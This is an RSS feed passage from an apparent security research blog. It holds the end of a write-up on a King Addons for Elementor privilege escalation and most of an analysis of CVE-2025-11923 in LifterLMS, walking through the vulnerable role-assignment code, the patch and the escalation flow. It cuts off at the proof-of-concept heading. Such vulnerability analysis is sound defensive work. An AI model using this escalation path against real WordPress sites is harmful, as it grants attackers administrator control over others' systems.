data-sub-html=&#34;&lt;h2&gt;Login&lt;/h2&gt;&lt;p&gt;Login&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/login.png&#39; alt=&#34;Login&#34; height=&#34;740&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Login&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-6325&lt;/strong&gt; vulnerability in the &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; plugin allows &lt;strong&gt;Privilege Escalation&lt;/strong&gt; through the user registration form. The root cause is that the &lt;code&gt;user_role&lt;/code&gt; value is taken directly from the request without validation before being assigned to a newly created account. Version &lt;strong&gt;v51.1.14&lt;/strong&gt; still contains this vulnerability, while &lt;strong&gt;v51.1.36&lt;/strong&gt; has already been patched and is no longer exploitable. Diff analysis between versions shows that the patch restricts allowed roles and prevents users from assigning dangerous roles such as &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;The vulnerability originates from &lt;strong&gt;insufficient input validation (untrusted input)&lt;/strong&gt; in the AJAX registration handler.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; allows &lt;strong&gt;unauthenticated users&lt;/strong&gt; to send requests and exploit the vulnerability.&lt;/li&gt;&#xA;&lt;li&gt;The patch restricts allowed roles (&lt;code&gt;subscriber&lt;/code&gt;, &lt;code&gt;customer&lt;/code&gt;) to &lt;strong&gt;prevent privilege escalation&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;When analyzing vulnerabilities, always compare &lt;strong&gt;vulnerable vs. patched versions&lt;/strong&gt; to identify security changes.&lt;/li&gt;&#xA;&lt;li&gt;Using an &lt;strong&gt;older version (v51.1.14)&lt;/strong&gt; may be suitable for analysis or PoC purposes, but it should never be deployed in a production environment.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/king-addons/vulnerability/wordpress-king-addons-for-elementor-plugin-51-1-36-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress King Addons for Elementor Plugin &amp;lt;= 51.1.36 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11923 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2026-01-02-cve-2025-11923/</link>
      <pubDate>Fri, 02 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2026-01-02-cve-2025-11923/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The LifterLMS plugin for WordPress contains a &lt;strong&gt;sensitive information disclosure vulnerability&lt;/strong&gt; affecting all versions up to &lt;strong&gt;9.1.0&lt;/strong&gt;, exposed through the REST API endpoint &lt;strong&gt;/mcp/v1/&lt;/strong&gt;. This vulnerability leaks a &lt;strong&gt;Bearer Token&lt;/strong&gt; when the &lt;strong&gt;“No-Auth URL”&lt;/strong&gt; option is enabled. This allows an attacker to obtain a valid bearer token &lt;strong&gt;without authentication&lt;/strong&gt;, granting access to an authenticated session and enabling actions such as &lt;strong&gt;creating new administrator accounts&lt;/strong&gt;, leading to &lt;strong&gt;privilege escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11923&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11923&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: ≤ 9.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 9.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Student&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/lifterlms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LifterLMS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;LifterLMS&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;9.1.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;9.1.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;    // $this-&amp;gt;namespace = &amp;#39;llms/v1&amp;#39;&#xA;    // $this-&amp;gt;rest_base = &amp;#39;students&amp;#39;&#xA;    register_rest_route(&#xA;        $this-&amp;gt;namespace,&#xA;        &amp;#39;/&amp;#39; . $this-&amp;gt;rest_base . &amp;#39;/(?P&amp;lt;id&amp;gt;[\d]&amp;#43;)&amp;#39;,&#xA;        array(&#xA;            &amp;#39;args&amp;#39;   =&amp;gt; array(&#xA;                &amp;#39;id&amp;#39; =&amp;gt; array(&#xA;                    &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;Unique identifier for the resource.&amp;#39;, &amp;#39;lifterlms&amp;#39; ),&#xA;                    &amp;#39;type&amp;#39;        =&amp;gt; &amp;#39;integer&amp;#39;,&#xA;                ),&#xA;            ),&#xA;            ...&#xA;            array(&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::EDITABLE, // POST, PUT, PATCH&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;update_item&amp;#39; ),&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;update_item_permissions_check&amp;#39; ),&#xA;                &amp;#39;args&amp;#39;                =&amp;gt; $this-&amp;gt;get_endpoint_args_for_item_schema( WP_REST_Server::EDITABLE ),&#xA;            ),&#xA;            ...&#xA;            &amp;#39;schema&amp;#39; =&amp;gt; array( $this, &amp;#39;get_public_item_schema&amp;#39; ),&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this configuration, the API is exposed at:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/llms/v1/students/{id}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Where:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;(?P&amp;lt;id&amp;gt;[\d]+)&lt;/code&gt; is a named regex group automatically parsed by WordPress.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;WP_REST_Server::EDITABLE&lt;/code&gt; corresponds to &lt;code&gt;POST&lt;/code&gt;, &lt;code&gt;PUT&lt;/code&gt;, &lt;code&gt;PATCH&lt;/code&gt; and requires the &lt;code&gt;X-WP-Nonce&lt;/code&gt; header.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;When a valid request reaches this endpoint, WordPress invokes &lt;code&gt;update_item()&lt;/code&gt;.&#xA;Before that, the request must pass the permission check via &lt;code&gt;update_item_permissions_check()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item_permissions_check( $request ) {&#xA;    if ( get_current_user_id() === $request[&amp;#39;id&amp;#39;] ) {&#xA;        return true;&#xA;    }&#xA;&#xA;    if ( ! current_user_can( &amp;#39;edit_students&amp;#39;, $request[&amp;#39;id&amp;#39;] ) ) {&#xA;        return llms_rest_authorization_required_error( __( &amp;#39;You are not allowed to edit this student.&amp;#39;, &amp;#39;lifterlms&amp;#39; ) );&#xA;    }&#xA;&#xA;    return $this-&amp;gt;check_roles_permissions( $request );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At line 2, &lt;code&gt;get_current_user_id()&lt;/code&gt; retrieves the ID of the currently logged-in user and compares it with the &lt;code&gt;id&lt;/code&gt; provided in the request. If both match, the request is immediately allowed.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;get_current_user_id()&lt;/code&gt; returns a non-zero value only if authentication succeeded. This depends on the presence of a valid &lt;code&gt;X-WP-Nonce&lt;/code&gt;. WordPress always invokes &lt;code&gt;rest_cookie_check_errors&lt;/code&gt; during REST processing.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;941&#34; width=&#34;1700&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;If the nonce is missing or invalid, the current user ID becomes &lt;code&gt;0&lt;/code&gt;, and the request is rejected.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/invalid.png&#39; alt=&#34;Invalid nonce&#34; height=&#34;560&#34; width=&#34;1563&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;To obtain the REST API nonce, the user must log into the Admin Dashboard and read &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; from the browser console, as WordPress only injects this value for authenticated sessions.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/get_nonce.png&#39; alt=&#34;Get nonce&#34; height=&#34;697&#34; width=&#34;1919&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Once permission checks pass, &lt;code&gt;update_item()&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item( $request ) {&#xA;    $object = $this-&amp;gt;get_object( $request[&amp;#39;id&amp;#39;] );&#xA;    if ( is_wp_error( $object ) ) {&#xA;        return $object;&#xA;    }&#xA;&#xA;    $schema = $this-&amp;gt;get_item_schema();&#xA;    $item   = $this-&amp;gt;prepare_item_for_database( $request );&#xA;    $item   = array_diff_key( $item, $this-&amp;gt;get_additional_fields() );&#xA;    $object = $this-&amp;gt;update_object( $item, $request );&#xA;&#xA;    $response = $this-&amp;gt;prepare_item_for_response( $object, $request );&#xA;    return $response;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This creates a user object and updates it using &lt;code&gt;update_object()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function update_object( $prepared, $request ) {&#xA;    $prepared[&amp;#39;ID&amp;#39;] = $prepared[&amp;#39;id&amp;#39;];&#xA;&#xA;    $object_id = wp_update_user( $prepared );&#xA;    if ( is_wp_error( $object_id ) ) {&#xA;        return $object_id;&#xA;    }&#xA;&#xA;    unset( $prepared[&amp;#39;ID&amp;#39;] );&#xA;&#xA;    return $this-&amp;gt;update_additional_data( $object_id, $prepared, $request );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;$prepared&lt;/code&gt; data comes from &lt;code&gt;prepare_item_for_database()&lt;/code&gt;. However, the &lt;code&gt;roles&lt;/code&gt; field—critical for privilege escalation—is removed during this step.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/miss_role.png&#39; alt=&#34;Miss role&#34; height=&#34;528&#34; width=&#34;787&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Afterward, &lt;code&gt;update_additional_data()&lt;/code&gt; is executed to process extra fields not stored in the main user table:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function update_additional_data( $object_id, $prepared, $request ) {&#xA;    $object = $this-&amp;gt;get_object( $object_id );&#xA;    ...&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        $user = $object-&amp;gt;get_user();&#xA;        $user-&amp;gt;set_role( &amp;#39;&amp;#39; );&#xA;        foreach ( $request[&amp;#39;roles&amp;#39;] as $role ) {&#xA;            $user-&amp;gt;add_role( $role );&#xA;        }&#xA;    }&#xA;&#xA;    return $object;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function recreates the user object and assigns roles directly from user input.&lt;/p&gt;&#xA;&lt;p&gt;This is the root cause of the &lt;strong&gt;Privilege Escalation&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;The patch modifies &lt;code&gt;update_item_permissions_check()&lt;/code&gt; as follows:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item_permissions_check( $request ) {&#xA;&#xA;    if ( is_wp_error( ( new WP_REST_Users_Controller() )-&amp;gt;update_item_permissions_check( $request ) ) ) {&#xA;        return llms_rest_authorization_required_error( __( &amp;#39;You are not allowed to edit this user.&amp;#39;, &amp;#39;lifterlms&amp;#39; ) );&#xA;    }&#xA;&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        return $this-&amp;gt;check_roles_permissions( $request );&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This ensures WordPress core permission checks are always enforced.&lt;/p&gt;&#xA;&lt;p&gt;If the request includes &lt;code&gt;roles&lt;/code&gt;, &lt;code&gt;check_roles_permissions()&lt;/code&gt; is invoked.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function check_roles_permissions( $request ) {&#xA;&#xA;    global $wp_roles;&#xA;&#xA;    $schema = $this-&amp;gt;get_item_schema();&#xA;    $roles  = array();&#xA;&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        $roles = $request[&amp;#39;roles&amp;#39;];&#xA;    } elseif ( ! empty( $schema[&amp;#39;properties&amp;#39;][&amp;#39;roles&amp;#39;][&amp;#39;default&amp;#39;] ) ) {&#xA;        $roles = $schema[&amp;#39;properties&amp;#39;][&amp;#39;roles&amp;#39;][&amp;#39;default&amp;#39;];&#xA;    }&#xA;&#xA;    foreach ( $roles as $role ) {&#xA;&#xA;        if ( ! isset( $wp_roles-&amp;gt;role_objects[ $role ] ) ) {&#xA;            return llms_rest_bad_request_error(&#xA;                sprintf( __( &amp;#39;The role %s does not exist.&amp;#39;, &amp;#39;lifterlms&amp;#39; ), $role )&#xA;            );&#xA;        }&#xA;&#xA;        $potential_role = $wp_roles-&amp;gt;role_objects[ $role ];&#xA;&#xA;        if (&#xA;            ! ( is_multisite() &amp;amp;&amp;amp; current_user_can( &amp;#39;manage_sites&amp;#39; ) )&#xA;            &amp;amp;&amp;amp; get_current_user_id() === $request[&amp;#39;id&amp;#39;]&#xA;            &amp;amp;&amp;amp; ! $potential_role-&amp;gt;has_cap( &amp;#39;edit_users&amp;#39; )&#xA;        ) {&#xA;            return llms_rest_authorization_required_error(&#xA;                __( &amp;#39;You are not allowed to give users this role.&amp;#39;, &amp;#39;lifterlms&amp;#39; )&#xA;            );&#xA;        }&#xA;&#xA;        require_once ABSPATH . &amp;#39;wp-admin/includes/admin.php&amp;#39;;&#xA;&#xA;        $editable_roles = get_editable_roles();&#xA;&#xA;        if ( empty( $editable_roles[ $role ] ) ) {&#xA;            return llms_rest_authorization_required_error(&#xA;                __( &amp;#39;You are not allowed to give users this role.&amp;#39;, &amp;#39;lifterlms&amp;#39; )&#xA;            );&#xA;        }&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This ensures:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Core WordPress permission checks are always enforced.&lt;/li&gt;&#xA;&lt;li&gt;Users cannot assign roles they are not allowed to manage.&lt;/li&gt;&#xA;&lt;li&gt;Self–privilege escalation is prevented.&lt;/li&gt;&#xA;&lt;li&gt;Unauthorized role assignment is fully blocked.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated Student (has valid nonce)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST /wp-json/llms/v1/students/{id}&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;update_item_permissions_check()&amp;#34;]&#xA;&#xA;C --&amp;gt; D{&amp;#34;get_current_user_id() == request.id ?&amp;#34;}&#xA;&#xA;D -- Yes --&amp;gt; E[&amp;#34;Bypass capability checks&amp;#34;]&#xA;D -- No --&amp;gt; F[&amp;#34;Denied&amp;#34;]&#xA;&#xA;E --&amp;gt; G[&amp;#34;update_item()&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;prepare_item_for_database()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;roles field removed from prepared data&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;update_object()&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;update_additional_data()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Read roles directly from request&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;Apply roles via set_role() / add_role()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;User role escalated&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; 